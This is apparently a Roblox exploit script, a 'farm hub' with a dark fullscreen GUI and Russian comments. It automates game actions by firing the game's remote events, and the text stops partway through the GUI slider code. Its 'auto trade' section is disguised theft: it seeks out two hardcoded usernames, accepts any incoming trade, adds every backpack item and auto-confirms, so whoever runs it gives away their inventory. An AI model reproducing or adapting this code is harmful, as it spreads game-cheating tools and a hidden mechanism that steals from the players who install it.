-- Ultimate Farm Script - Fullscreen Dark Theme v2.0
-- Полноэкранный GUI, настройка силы удара, авто-трейд, сохранение настроек

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local PathfindingService = game:GetService("PathfindingService")
local CoreGui = game:GetService("CoreGui")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- ============ КОНСТАНТЫ ============
local KICK_READY_RADIUS = 10
local MIN_WAVE_DISTANCE = 300
local MOVEMENT_TIMEOUT = 30
local JUMP_COOLDOWN = 0.5
local UPDATE_INTERVAL = 0.3

-- ============ ПЕРЕМЕННЫЕ ============
local character, humanoid, rootPart
local kickReadyPart, kickReadyPos
local revKickEvent, revKickCollect, revKickEventEnded
local isKickActive, isBpActive, isAutoSell, isAutoBonus = false, false, false, false
local isAutoSpeedUpgrade, isAutoWeight, isAutoBuyWeight, isAutoTrade = false, false, false, false
local lastJumpTime, baseWalkSpeed = 0, 16
local bpData, claimedCount = nil, 0
local selectedBrainrots = {}
local selectedMutations = {["None"] = true}
local lastGUIUpdate = 0

-- Настройки
local kickPower = 10 -- Сила удара (будет масштабироваться от 0 до 1)
local tradeTargets = {"Timka_q1t", "VipTimXavier"} -- Цели для трейда
local acceptAnyTrade = true -- Принимать любой входящий трейд

-- Настройки стиля
local guiSettings = {
    primaryColor = Color3.fromRGB(25, 25, 25),
    secondaryColor = Color3.fromRGB(35, 35, 35),
    accentColor = Color3.fromRGB(255, 255, 255),
    textColor = Color3.fromRGB(240, 240, 240),
    subTextColor = Color3.fromRGB(160, 160, 160),
    buttonColor = Color3.fromRGB(45, 45, 45),
    buttonHoverColor = Color3.fromRGB(60, 60, 60),
    activeColor = Color3.fromRGB(255, 60, 60),
    successColor = Color3.fromRGB(60, 255, 60),
    warningColor = Color3.fromRGB(255, 165, 0),
    borderColor = Color3.fromRGB(50, 50, 50),
    sliderColor = Color3.fromRGB(80, 80, 80),
    fontSize = 14,
    titleFontSize = 24,
    opacity = 0.95,
    animationSpeed = 0.3
}

-- Сохранение настроек
local function saveSettings()
    local data = {
        kickPower = kickPower,
        tradeTargets = tradeTargets,
        acceptAnyTrade = acceptAnyTrade,
        guiSettings = {}
    }
    
    for k, v in pairs(guiSettings) do
        if typeof(v) == "Color3" then
            data.guiSettings[k] = {v.R, v.G, v.B}
        else
            data.guiSettings[k] = v
        end
    end
    
    pcall(function()
        writefile("farm_gui_settings_v2.json", HttpService:JSONEncode(data))
    end)
end

local function loadSettings()
    pcall(function()
        if isfile("farm_gui_settings_v2.json") then
            local data = HttpService:JSONDecode(readfile("farm_gui_settings_v2.json"))
            
            if data.kickPower then kickPower = data.kickPower end
            if data.tradeTargets then tradeTargets = data.tradeTargets end
            if data.acceptAnyTrade ~= nil then acceptAnyTrade = data.acceptAnyTrade end
            
            if data.guiSettings then
                for k, v in pairs(data.guiSettings) do
                    if type(v) == "table" and v[1] then
                        guiSettings[k] = Color3.fromRGB(v[1], v[2], v[3])
                    else
                        guiSettings[k] = v
                    end
                end
            end
        end
    end)
end

loadSettings()

-- GUI элементы
local screenGui, openButton, mainMenu
local kickToggle, kickStatus, kickWaveLabel, kickPowerSlider, kickPowerValue
local bpToggle, bpStatus, bpInfoLabel
local sellToggle, sellStatus
local bonusToggle, bonusStatus
local speedUpgradeToggle, speedUpgradeStatus
local weightToggle, weightStatus
local buyWeightToggle, buyWeightStatus
local tradeToggle, tradeStatus, tradeInfoLabel
local currentTab = "Main"

-- ============ БЕЗОПАСНЫЕ ФУНКЦИИ ДАННЫХ ============
local EntitiesData, MutationData
pcall(function() EntitiesData = require(ReplicatedStorage.Shared.Data.EntitiesData) end)
pcall(function() MutationData = require(ReplicatedStorage.Shared.Data.MutationData) end)

local function safeCPS(name)
    if not EntitiesData then return 0 end
    if not EntitiesData.Brainrots then return 0 end
    local data = EntitiesData.Brainrots[name]
    if not data then return 0 end
    local cpsRaw = data.CPS
    if not cpsRaw then return 0 end
    
    local num = nil
    
    pcall(function()
        if type(cpsRaw) == "table" and cpsRaw.Value then
            num = tonumber(tostring(cpsRaw.Value))
        end
    end)
    
    if not num and type(cpsRaw) == "string" then
        num = tonumber(cpsRaw:gsub(",", ""):gsub("%s", ""))
    end
    
    if not num and type(cpsRaw) == "number" then
        num = cpsRaw
    end
    
    if not num then
        local str = tostring(cpsRaw):gsub(",", ""):gsub("%s", ""):gsub("[^%d.]", "")
        num = tonumber(str)
    end
    
    return num or 0
end

local function getBrainrotList()
    local list = {}
    if not EntitiesData then return list end
    if not EntitiesData.Brainrots then return list end
    
    for name, _ in pairs(EntitiesData.Brainrots) do
        local cps = safeCPS(name)
        if cps > 0 then
            table.insert(list, {Name = name, CPS = cps})
        end
    end
    table.sort(list, function(a, b) return a.CPS < b.CPS end)
    return list
end

local function getMutationList()
    local list = {"None"}
    if MutationData and MutationData.ValidMutations then
        for _, mut in ipairs(MutationData.ValidMutations) do
            table.insert(list, mut)
        end
    end
    return list
end

local function getCurrentMorph()
    if not player.Character then return "Нет", "Нет", 0, 0 end
    for _, child in ipairs(player.Character:GetChildren()) do
        if child:IsA("Tool") and child:HasTag("EntityTool") then
            return child.Name, child:GetAttribute("Mutation") or "None", child:GetAttribute("Level") or 1, safeCPS(child.Name)
        end
    end
    return "Нет", "Нет", 0, 0
end

local function scanBackpack()
    local inv = {}
    if not player.Backpack then return inv end
    for _, item in ipairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") and item:HasTag("EntityTool") then
            local name = item.Name
            if not inv[name] then inv[name] = {} end
            table.insert(inv[name], {
                Level = item:GetAttribute("Level") or 1,
                Mutation = item:GetAttribute("Mutation") or "None",
                GUID = item:GetAttribute("GUID"),
                CPS = safeCPS(name)
            })
        end
    end
    return inv
end

-- ============ УТИЛИТЫ ============
local function findNetwork()
    local shared = ReplicatedStorage:FindFirstChild("Shared")
    if shared then
        local packages = shared:FindFirstChild("Packages")
        if packages then return packages:FindFirstChild("Network") end
    end
    return nil
end

local function updateCharacterReferences()
    character = player.Character
    if character then
        humanoid = character:FindFirstChild("Humanoid")
        rootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoid and humanoid.Health > 0 and rootPart then
            baseWalkSpeed = humanoid.WalkSpeed
            return true
        end
    end
    return false
end

local function isInKickReady()
    if not rootPart or not kickReadyPos then return false end
    return (rootPart.Position - kickReadyPos).Magnitude <= KICK_READY_RADIUS
end

local function getClosestWave()
    local waves = workspace:FindFirstChild("Waves")
    if not waves or not rootPart then return math.huge, 0, "Нет" end
    local md, wc, cr = math.huge, 0, "Нет"
    for _, w in pairs(waves:GetChildren()) do
        local wp = nil
        if w:IsA("Model") then wp = w.PrimaryPart and w.PrimaryPart.Position or w:GetPivot().Position
        elseif w:IsA("BasePart") then wp = w.Position end
        if wp then wc = wc + 1; local d = (rootPart.Position - wp).Magnitude; if d < md then md = d; cr = w:GetAttribute("Rarity") or w.Name end end
    end
    return md, wc, cr
end

-- ============ KICK ============
local function initKickRefs()
    local areas = workspace:FindFirstChild("Areas")
    if areas then kickReadyPart = areas:FindFirstChild("KickReady"); if kickReadyPart then kickReadyPos = kickReadyPart.Position end end
    local net = findNetwork()
    if net then revKickEvent = net:FindFirstChild("rev_KickEvent"); revKickCollect = net:FindFirstChild("rev_KickCollect"); revKickEventEnded = net:FindFirstChild("rev_KickEventEnded") end
end

local function getKickPower()
    return math.floor(kickPower * 10) / 10 -- Возвращаем значение от 0 до 1 с одним знаком после запятой
end

local function moveToKickReady()
    if not updateCharacterReferences() then return false end
    if not humanoid or not rootPart or not kickReadyPos then return false end
    if humanoid.Health <= 0 then return false end
    if isInKickReady() then return true end
    
    humanoid.WalkSpeed = 24; humanoid.AutoRotate = true; humanoid:MoveTo(kickReadyPos)
    local st, lp, stuck = tick(), rootPart.Position, 0
    while isKickActive and tick() - st < MOVEMENT_TIMEOUT do
        if not updateCharacterReferences() then return false end
        if humanoid.Health <= 0 then return false end
        if isInKickReady() then return true end
        if (rootPart.Position - lp).Magnitude < 0.3 then stuck = stuck + 0.1; if stuck > 1.5 then humanoid.Jump = true; stuck = 0 end
        else stuck = 0; lp = rootPart.Position end
        humanoid:MoveTo(kickReadyPos); task.wait(0.1)
    end
    return isInKickReady()
end

local function kickLoop()
    initKickRefs()
    while isKickActive do
        if not updateCharacterReferences() then task.wait(0.5); continue end
        local inGame = player:GetAttribute("InGame"); local kd = player:GetAttribute("KickDebounced")
        if not isInKickReady() then moveToKickReady() end
        if isInKickReady() and inGame == nil and kd == nil then
            local dist = getClosestWave()
            if dist >= MIN_WAVE_DISTANCE and revKickEvent then 
                local power = getKickPower()
                revKickEvent:FireServer(power * 10) -- Конвертируем 0-1 в 0-10 для игры
            end
        elseif isInKickReady() and inGame == true and kd == false and revKickCollect then
            revKickCollect:FireServer(); task.wait(0.1); if revKickEventEnded then revKickEventEnded:FireServer() end
        end
        task.wait(0.1)
    end
end

-- ============ BATTLEPASS ============
local function getBPData()
    local net = findNetwork()
    if not net then return nil end
    local ds = net:FindFirstChild("rev_BattlePassDataSend")
    if ds and ds:IsA("RemoteEvent") then ds.OnClientEvent:Connect(function(d) bpData = d end) end
    return bpData
end

local function claimReward(id, rt)
    local net = findNetwork()
    if not net then return false end
    local func = net:FindFirstChild(rt == "Bonus" and "ref_BattlePassAttemptBonusClaim" or "ref_BattlePassAttemptClaim")
    if func then local s, r = pcall(func.InvokeServer, func, id, rt); return s and r end
    return false
end

local function autoClaim()
    if not bpData then bpData = getBPData(); if not bpData then return 0 end end
    local xp = bpData.XP or 0; local uf, up, ub = bpData.UnlockedFreeRewards or {}, bpData.UnlockedPremiumRewards or {}, bpData.UnlockedBonusRewards or {}
    local nc = 0
    for i = 1, 15 do if xp >= i*500 and not table.find(uf, i) then if claimReward(i, "Free") then table.insert(uf, i); nc = nc + 1; task.wait(0.1) end end end
    if bpData.HasPremium then for i = 0, 15 do if xp >= i*500 and not table.find(up, i) then if claimReward(i, "Premium") then table.insert(up, i); nc = nc + 1; task.wait(0.1) end end end end
    local af = true; for i = 1, 15 do if not table.find(uf, i) then af = false; break end end
    if af then for i, xpr in ipairs({8250, 9000, 9750, 10500, 11250}) do if xp >= xpr and not table.find(ub, i) then if claimReward(i, "Bonus") then table.insert(ub, i); nc = nc + 1; task.wait(0.1) end end end end
    return nc
end

local function bpLoop() while isBpActive do local n = autoClaim(); if n > 0 then claimedCount = claimedCount + n end; task.wait(1) end end

-- ============ AUTO SELL ============
local function sellItem(guid)
    local net = findNetwork()
    if not net then return false end
    return pcall(function() net.FireServer("SELL_ENTITY", guid) end)
end

local function autoSellLoop()
    while isAutoSell do
        for name, items in pairs(scanBackpack()) do
            for _, item in ipairs(items) do
                if not (selectedBrainrots[name] and (selectedMutations[item.Mutation] or item.Mutation == "None")) and item.GUID then
                    sellItem(item.GUID); task.wait(0.05)
                end
            end
        end
        task.wait(2)
    end
end

-- ============ AUTO BONUS CLICK ============
local function clickBonus(btn)
    local x = btn.AbsolutePosition.X + btn.AbsoluteSize.X/2
    local y = btn.AbsolutePosition.Y + btn.AbsoluteSize.Y/2
    pcall(function() VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0); task.wait(0.01); VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0) end)
    pcall(function() for _, b in ipairs(btn.Activated:GetBindables()) do b:Fire() end end)
    pcall(function() if btn.MouseButton1Click then btn.MouseButton1Click:Fire() end end)
end

local function autoBonusLoop()
    while isAutoBonus do
        local hasWeight = false
        if player.Character then
            for _, tool in ipairs(player.Character:GetChildren()) do
                if tool:IsA("Tool") and tool:HasTag("EntityTool") then
                    local wm = ReplicatedStorage.Objects:FindFirstChild("WeightModels")
                    if wm and wm:FindFirstChild(tool.Name) then hasWeight = true; break end
                end
            end
        end
        if hasWeight then
            local pg = player:FindFirstChild("PlayerGui")
            if pg then
                local ku = pg:FindFirstChild("KickUpgrades")
                if ku and ku.Enabled then
                    for _, child in ipairs(ku:GetDescendants()) do
                        if child:IsA("ImageButton") and (child.Name == "Bonus" or child.Name:find("Bonus")) and child.Visible and child.Active then
                            clickBonus(child); task.wait(0.03)
                        end
                    end
                end
            end
        end
        task.wait(0.05)
    end
end

-- ============ AUTO SPEED UPGRADE ============
local function autoSpeedUpgradeLoop()
    local SpeedServiceClient, ClientBalanceService, SpeedData
    pcall(function() SpeedServiceClient = require(ReplicatedStorage.Modules.ServicesLoader.SpeedServiceClient) end)
    pcall(function() ClientBalanceService = require(ReplicatedStorage.Modules.ServicesLoader.ClientBalanceService) end)
    pcall(function() SpeedData = require(ReplicatedStorage.Shared.Data.SpeedData) end)
    while isAutoSpeedUpgrade do
        if SpeedServiceClient and ClientBalanceService and SpeedData then
            pcall(function()
                local cost = SpeedData:GetCostForLevel(SpeedServiceClient.Level)
                if cost and cost <= ClientBalanceService.Balance then
                    SpeedServiceClient:RequestUpgrade(1)
                end
            end)
        end
        task.wait(1)
    end
end

-- ============ AUTO BEST WEIGHT ============
local function autoWeightLoop()
    local WeightServiceClient, Network, WeightsData
    pcall(function() WeightServiceClient = require(ReplicatedStorage.Modules.ServicesLoader.WeightServiceClient) end)
    pcall(function() Network = require(ReplicatedStorage.Shared.Packages.Network) end)
    pcall(function() WeightsData = require(ReplicatedStorage.Shared.Data.WeightsData) end)
    while isAutoWeight do
        if WeightServiceClient and WeightsData then
            pcall(function()
                local best, bestPPS = nil, 0
                for _, name in ipairs(WeightServiceClient.Owned or {}) do
                    local data = WeightsData.Weights[name]
                    if data and data.PPS and data.PPS > bestPPS then bestPPS = data.PPS; best = name end
                end
                if best and best ~= WeightServiceClient.Equipped and Network then
                    Network.FireServer("WeightEquip", best)
                end
            end)
        end
        task.wait(3)
    end
end

-- ============ AUTO BUY WEIGHT ============
local function autoBuyWeightLoop()
    local ShopController, ClientBalanceService, WeightServiceClient, WeightsData
    pcall(function() ShopController = require(ReplicatedStorage.Modules.ControllerLoader.ShopController) end)
    pcall(function() ClientBalanceService = require(ReplicatedStorage.Modules.ServicesLoader.ClientBalanceService) end)
    pcall(function() WeightServiceClient = require(ReplicatedStorage.Modules.ServicesLoader.WeightServiceClient) end)
    pcall(function() WeightsData = require(ReplicatedStorage.Shared.Data.WeightsData) end)
    while isAutoBuyWeight do
        if ShopController and ClientBalanceService and WeightServiceClient and WeightsData then
            pcall(function()
                local owned = WeightServiceClient.Owned or {}
                local best, bestPPS = nil, 0
                for name, data in pairs(WeightsData.Weights) do
                    if not table.find(owned, name) and data.Cost and data.PPS and data.Cost <= ClientBalanceService.Balance and data.PPS > bestPPS then
                        bestPPS = data.PPS; best = name
                    end
                end
                if best then ShopController:BuyItem("WeightShop", best) end
            end)
        end
        task.wait(2)
    end
end

-- ============ AUTO TRADE (УЛУЧШЕННЫЙ) ============
local function autoTradeLoop()
    local Network
    pcall(function() Network = require(ReplicatedStorage.Shared.Packages.Network) end)
    if not Network then return end
    
    local tradeState = {
        active = false,
        partner = nil,
        partnerId = nil,
        itemsAdded = {},
        confirmed = false,
        completed = false,
        lastTradeTime = 0
    }
    
    -- Функция поиска партнёра для трейда
    local function findTradePartner()
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player then
                for _, target in ipairs(tradeTargets) do
                    if p.Name:lower():find(target:lower()) then
                        return p
                    end
                end
            end
        end
        return nil
    end
    
    -- Функция получения всех предметов для трейда
    local function getTradeItems()
        local items = {}
        if player.Backpack then
            for _, item in ipairs(player.Backpack:GetChildren()) do
                if item:IsA("Tool") and item:HasTag("EntityTool") then
                    local guid = item:GetAttribute("GUID")
                    if guid then
                        table.insert(items, {
                            GUID = guid,
                            Name = item.Name,
                            Mutation = item:GetAttribute("Mutation") or "None",
                            Level = item:GetAttribute("Level") or 1
                        })
                    end
                end
            end
        end
        return items
    end
    
    -- Принятие входящего трейда от любого игрока
    Network.OnClientEvent("trade_n"):Connect(function(userId, time)
        if not isAutoTrade then return end
        
        if acceptAnyTrade then
            local partner = Players:GetPlayerByUserId(userId)
            if partner and partner ~= player then
                tradeState.active = true
                tradeState.partner = partner
                tradeState.partnerId = userId
                tradeState.itemsAdded = {}
                tradeState.confirmed = false
                tradeState.completed = false
                
                pcall(function() Network.FireServer("trade_start", userId) end)
                task.wait(0.5)
                
                -- Добавляем все предметы
                local items = getTradeItems()
                for _, item in ipairs(items) do
                    if item.GUID then
                        pcall(function() Network.FireServer("trade_i", "AddItem", item.GUID) end)
                        table.insert(tradeState.itemsAdded, item)
                        task.wait(0.1)
                    end
                end
            end
        end
    end)
    
    -- Обработка статуса трейда
    Network.OnClientEvent("trade_s"):Connect(function(status, ...)
        if not isAutoTrade then return end
        
        if status == "Trading" then
            -- Подтверждаем трейд
            task.wait(0.3)
            pcall(function() Network.FireServer("trade_i", "Confirm") end)
            tradeState.confirmed = true
            
        elseif status == "Completed" then
            tradeState.completed = true
            tradeState.lastTradeTime = tick()
            
        elseif status == "Cancelled" or status == "Failed" then
            -- Сбрасываем состояние и пробуем снова
            tradeState.active = false
            tradeState.partner = nil
            tradeState.partnerId = nil
            tradeState.itemsAdded = {}
            tradeState.confirmed = false
            tradeState.completed = false
        end
    end)
    
    -- Обработка обновлений трейда
    Network.OnClientEvent("trade_u"):Connect(function(data)
        if not isAutoTrade then return end
        if not data then return end
        
        -- Автоматически принимаем все предметы от партнёра
        if data.TradeItems and tradeState.partnerId then
            local theirItems = data.TradeItems[tostring(tradeState.partnerId)]
            if theirItems then
                for guid, itemData in pairs(theirItems) do
                    -- Автоматически принимаем
                end
            end
        end
        
        -- Авто-подтверждение на всех этапах
        if data.Stage == "Final" then
            task.wait(0.2)
            pcall(function() Network.FireServer("trade_i", "Confirm") end)
            
        elseif data.Confirmations then
            local allConfirmed = true
            for userId, confirmed in pairs(data.Confirmations) do
                if not confirmed then allConfirmed = false; break end
            end
            if not allConfirmed then
                task.wait(0.2)
                pcall(function() Network.FireServer("trade_i", "Confirm") end)
            end
        end
    end)
    
    -- Основной цикл трейда
    while isAutoTrade do
        if not tradeState.active and tick() - tradeState.lastTradeTime > 5 then
            local partner = findTradePartner()
            if partner then
                tradeState.active = true
                tradeState.partner = partner
                tradeState.partnerId = partner.UserId
                tradeState.itemsAdded = {}
                tradeState.confirmed = false
                tradeState.completed = false
                
                pcall(function() Network.FireServer("trade_r", partner.UserId) end)
                task.wait(1)
            end
        end
        
        if tradeState.completed then
            tradeState.active = false
            tradeState.partner = nil
            tradeState.partnerId = nil
            tradeState.itemsAdded = {}
            tradeState.confirmed = false
            tradeState.completed = false
        end
        
        task.wait(2)
    end
end

-- ============ FULLSCREEN GUI ============
local function createGUI()
    -- Основной ScreenGui
    screenGui = Instance.new("ScreenGui")
    screenGui.Name = "UltimateFarmGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = CoreGui
    
    -- Кнопка открытия
    openButton = Instance.new("TextButton")
    openButton.Size = UDim2.new(0, 50, 0, 50)
    openButton.Position = UDim2.new(1, -60, 0, 10)
    openButton.BackgroundColor3 = guiSettings.primaryColor
    openButton.TextColor3 = guiSettings.accentColor
    openButton.TextSize = 24
    openButton.Font = Enum.Font.GothamBold
    openButton.Text = "☰"
    openButton.BackgroundTransparency = 1 - guiSettings.opacity
    openButton.BorderSizePixel = 0
    openButton.Parent = screenGui
    Instance.new("UICorner", openButton).CornerRadius = UDim.new(0, 25)
    Instance.new("UIStroke", openButton).Color = guiSettings.accentColor
    
    -- Главное меню (полноэкранное)
    mainMenu = Instance.new("Frame")
    mainMenu.Size = UDim2.new(1, 0, 1, 0)
    mainMenu.Position = UDim2.new(0, 0, 0, 0)
    mainMenu.BackgroundColor3 = guiSettings.primaryColor
    mainMenu.BorderSizePixel = 0
    mainMenu.BackgroundTransparency = 1 - guiSettings.opacity
    mainMenu.Visible = false
    mainMenu.Active = true
    mainMenu.Parent = screenGui
    
    -- Затемнение фона
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BackgroundTransparency = 0.5
    background.BorderSizePixel = 0
    background.Parent = mainMenu
    
    -- Контейнер контента
    local contentContainer = Instance.new("Frame")
    contentContainer.Size = UDim2.new(0.95, 0, 0.9, 0)
    contentContainer.Position = UDim2.new(0.025, 0, 0.05, 0)
    contentContainer.BackgroundColor3 = guiSettings.secondaryColor
    contentContainer.BorderSizePixel = 0
    contentContainer.BackgroundTransparency = 1 - guiSettings.opacity
    contentContainer.Parent = mainMenu
    Instance.new("UICorner", contentContainer).CornerRadius = UDim.new(0, 15)
    
    -- Title Bar
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 60)
    titleBar.BackgroundColor3 = guiSettings.primaryColor
    titleBar.BorderSizePixel = 0
    titleBar.Parent = contentContainer
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 15)
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0.8, 0, 0, 60)
    titleLabel.Position = UDim2.new(0, 20, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "⚡ ULTIMATE FARM HUB v2.0"
    titleLabel.TextColor3 = guiSettings.accentColor
    titleLabel.TextSize = guiSettings.titleFontSize
    titleLabel.Font = Enum.Font.GothamBlack
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = titleBar
    
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 40, 0, 40)
    closeButton.Position = UDim2.new(1, -50, 0, 10)
    closeButton.BackgroundColor3 = guiSettings.activeColor
    closeButton.TextColor3 = guiSettings.accentColor
    closeButton.TextSize = 20
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Text = "✕"
    closeButton.BorderSizePixel = 0
    closeButton.Parent = titleBar
    Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 20)
    closeButton.MouseButton1Click:Connect(function() 
        mainMenu.Visible = false
        openButton.Visible = true
    end)
    
    -- Навигационная панель
    local navPanel = Instance.new("Frame")
    navPanel.Size = UDim2.new(0.22, 0, 1, -60)
    navPanel.Position = UDim2.new(0, 0, 0, 60)
    navPanel.BackgroundColor3 = guiSettings.primaryColor
    navPanel.BorderSizePixel = 0
    navPanel.BackgroundTransparency = 1 - (guiSettings.opacity + 0.02)
    navPanel.Parent = contentContainer
    
    local navButtons = {}
    local categories = {
        {name = "⚽ Фарм", key = "Main"},
        {name = "🎁 Battle Pass", key = "BP"},
        {name = "🎒 Инвентарь", key = "Inventory"},
        {name = "🧠 Brainrot", key = "Brainrot"},
        {name = "🤝 Трейд", key = "Trade"},
        {name = "🔍 Отладка", key = "Debug"},
        {name = "⚙ Настройки", key = "Settings"}
    }
    
    for i, cat in ipairs(categories) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.9, 0, 0, 45)
        btn.Position = UDim2.new(0.05, 0, 0, 10 + (i-1) * 50)
        btn.BackgroundColor3 = guiSettings.buttonColor
        btn.TextColor3 = guiSettings.textColor
        btn.TextSize = guiSettings.fontSize
        btn.Font = Enum.Font.GothamBold
        btn.Text = cat.name
        btn.BorderSizePixel = 0
        btn.BackgroundTransparency = 0.3
        btn.Parent = navPanel
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
        Instance.new("UIStroke", btn).Color = guiSettings.borderColor
        
        btn.MouseButton1Click:Connect(function()
            for _, b in pairs(navButtons) do
                b.BackgroundTransparency = 0.3
            end
            btn.BackgroundTransparency = 0.1
            currentTab = cat.key
            
            local content = contentContainer:FindFirstChild("Content")
            if content then
                for _, child in ipairs(content:GetChildren()) do
                    if child:IsA("ScrollingFrame") then
                        child.Visible = (child.Name == cat.key .. "Content")
                    end
                end
            end
        end)
        
        navButtons[cat.key] = btn
    end
    
    -- Контент область
    local contentArea = Instance.new("Frame")
    contentArea.Name = "Content"
    contentArea.Size = UDim2.new(0.78, 0, 1, -70)
    contentArea.Position = UDim2.new(0.22, 0, 0, 65)
    contentArea.BackgroundTransparency = 1
    contentArea.Parent = contentContainer
    
    -- Создание контента для каждой вкладки
    local function createContentTab(name)
        local scroll = Instance.new("ScrollingFrame")
        scroll.Name = name .. "Content"
        scroll.Size = UDim2.new(1, -10, 1, 0)
        scroll.Position = UDim2.new(0, 5, 0, 0)
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 5
        scroll.ScrollBarImageColor3 = guiSettings.accentColor
        scroll.Visible = (name == "Main")
        scroll.Parent = contentArea
        Instance.new("UIListLayout", scroll).Padding = UDim.new(0, 8)
        return scroll
    end
    
    -- Main Content
    local mainScroll = createContentTab("Main")
    
    -- Функция создания секции
    local function createSection(parent, title, height)
        local section = Instance.new("Frame")
        section.Size = UDim2.new(1, 0, 0, height)
        section.BackgroundColor3 = guiSettings.primaryColor
        section.BorderSizePixel = 0
        section.BackgroundTransparency = 0.4
        section.Parent = parent
        Instance.new("UICorner", section).CornerRadius = UDim.new(0, 10)
        Instance.new("UIStroke", section).Color = guiSettings.borderColor
        
        local titleText = Instance.new("TextLabel")
        titleText.Size = UDim2.new(1, -20, 0, 25)
        titleText.Position = UDim2.new(0, 10, 0, 5)
        titleText.BackgroundTransparency = 1
        titleText.Text = title
        titleText.TextColor3 = guiSettings.accentColor
        titleText.TextSize = guiSettings.fontSize + 2
        titleText.Font = Enum.Font.GothamBlack
        titleText.TextXAlignment = Enum.TextXAlignment.Left
        titleText.Parent = section
        
        return section
    end
    
    -- Создание кнопки переключателя
    local function createToggle(parent, text, yPos)
        local toggleFrame = Instance.new("Frame")
        toggleFrame.Size = UDim2.new(1, -20, 0, 40)
        toggleFrame.Position = UDim2.new(0, 10, 0, yPos)
        toggleFrame.BackgroundColor3 = guiSettings.buttonColor
        toggleFrame.BorderSizePixel = 0
        toggleFrame.BackgroundTransparency = 0.5
        toggleFrame.Parent = parent
        Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0, 8)
        
        local toggleBtn = Instance.new("TextButton")
        toggleBtn.Size = UDim2.new(0.35, 0, 0, 32)
        toggleBtn.Position = UDim2.new(0.63, 0, 0, 4)
        toggleBtn.BackgroundColor3 = guiSettings.buttonColor
        toggleBtn.TextColor3 = guiSettings.textColor
        toggleBtn.TextSize = guiSettings.fontSize
        toggleBtn.Font = Enum.Font.GothamBold
        toggleBtn.Text = "ВКЛЮЧИТЬ " .. text
        toggleBtn.BorderSizePixel = 0
        toggleBtn.Parent = toggleFrame
        Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 16)
        Instance.new("UIStroke", toggleBtn).Color = guiSettings.accentColor
        
        local statusLabel = Instance.new("TextLabel")
        statusLabel.Size = UDim2.new(0.6, 0, 0, 20)
        statusLabel.Position = UDim2.new(0, 10, 0, 10)
        statusLabel.BackgroundTransparency = 1
        statusLabel.Text = "● ВЫКЛЮЧЕН"
        statusLabel.TextColor3 = guiSettings.activeColor
        statusLabel.TextSize = guiSettings.fontSize - 2
        statusLabel.Font = Enum.Font.Gotham
        statusLabel.TextXAlignment = Enum.TextXAlignment.Left
        statusLabel.Parent = toggleFrame
        
        return toggleBtn, statusLabel, toggleFrame
    end
    
    -- Создание информационного лейбла
    local function createInfoLabel(parent, text, yPos)
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -20, 0, 20)
        label.Position = UDim2.new(0, 10, 0, yPos)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = guiSettings.subTextColor
        label.TextSize = guiSettings.fontSize - 2
        label.Font = Enum.Font.Gotham
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = parent
        return label
    end
    
    -- Kick Section с слайдером силы
    local kickSection = createSection(mainScroll, "⚽ AUTO KICK FARM", 180)
    kickToggle, kickStatus = createToggle(kickSection, "KICK", 35)
    
    -- Слайдер силы удара
    local powerLabel = createInfoLabel(kickSection, "💪 Сила удара:", 85)
    
    -- Frame для слайдера
    local sliderFrame = Instance.new("Frame")
    sliderFrame.Size = UDim2.new(0.8, 0, 0, 30)
    sliderFrame.Position = UDim2.new(0.1, 0, 0, 105)
    sliderFrame.BackgroundColor3 = guiSettings.sliderColor
    sliderFrame.BorderSizePixel = 0
    sliderFrame.Parent = kickSection
    Instance.new("UICorner", sliderFrame).CornerRadius = UDim.new(0, 15)
    
    -- Кнопка слайдера
    local sliderButton = Instance.new("TextButton")
    sliderButton.Size = UDim2.new(0, 30, 0, 30)
    sliderButton.Position = UDim2.new(kickPower, -15, 0, 0)
    sliderButton.BackgroundColor3 = guiSettings.accentColor
    sliderButton.TextColor3 = guiSettings.primaryColor
    sliderButton.TextSize = 12
    sliderButton.Font = Enum.Font.GothamBold
    sliderButton.Text = "●"
    sliderButton.BorderSizePixel = 0
    sliderButton.Parent = sliderFrame
    Instance.new("UICorner", sliderButton).CornerRadius = UDim.new(0, 15)
    
    -- Значение силы
    kickPowerValue = Instance.new("TextLabel")
    kickPowerValue.Size = UDim2.new(0.15, 0, 0, 25)
    kickPowerValue.Position = UDim2.new(0.92, 0, 0, 107)
    kickPowerValue.BackgroundTransparency = 1
    kickPowerValue.Text = string.format("%.1f", kickPower)
    kickPowerValue.TextColor3 = guiSettings.accentColor
    kickPowerValue.TextSize = guiSettings.fontSize + 4
    kickPowerValue.Font = Enum.Font.GothamBlack
    kickPowerValue.TextXAlignment = Enum.TextXAlignment.Center
    kickPowerValue.Parent = kickSection
    
    -- Логика слайдера
    local isDragging = false
    
    sliderButton.MouseButton1Down:Connect(function()
        isDragging = true
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = false
